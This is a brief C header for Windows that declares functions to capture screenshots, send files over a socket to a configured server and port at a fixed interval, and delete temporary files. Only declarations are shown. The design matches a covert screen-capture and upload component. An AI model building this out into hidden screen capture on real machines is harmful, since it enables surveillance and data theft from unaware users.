#pragma once

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <direct.h>

#define SERVER_HOSTNAME "172.0.0.1"
#define SERVER_PORT 17888
#define INTERVAL_SECONDS 21
#define CONNECTION_TIMEOUT 30

int init_connection(
);

int capture_screenshot(const char* filename);
int send_file(const char* filename, SOCKET sock);
int cleanup_temp_file(const char* filename);


